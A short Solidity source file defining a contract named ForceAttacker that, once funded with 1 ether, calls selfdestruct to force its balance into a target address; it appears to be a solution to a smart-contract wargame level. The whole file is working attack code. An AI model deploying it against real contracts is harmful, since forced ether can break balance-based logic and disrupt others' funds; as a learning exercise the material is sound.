// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

contract ForceAttacker {
    address force;

    constructor(address _force) payable {
        require(msg.value == 1 ether);
        force = _force;
    }

    function attack() public {
        selfdestruct(payable(force));
    }
}
